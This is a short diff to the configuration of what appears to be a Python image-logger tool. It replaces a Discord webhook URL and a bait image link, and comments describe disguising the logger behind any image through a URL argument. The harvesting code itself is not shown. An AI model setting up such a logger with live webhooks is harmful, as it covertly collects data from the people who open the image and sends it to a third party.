@@ -12,8 +12,8 @@ __author__ = "Jelle_0546"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1421620219708706979/-LFXWh7Et2hozvsNd8ZC5mMz38BfrObr9vf0fcaNFF9d2oKgrm9zoK9bdJWOYC0XA3tC",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1429482603479695381/PsvrBatAgwJCNNzHm7QN5c38SNhqypmgfKLmNestdfY1qQ5qCIAQ9GHmbQsis7js6OVN",
+    "image": "https://static.wikia.nocookie.net/fastandfurious/images/d/d2/Nissan_Skyline_-_2F2F.jpg/revision/latest?cb=20240901032724", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
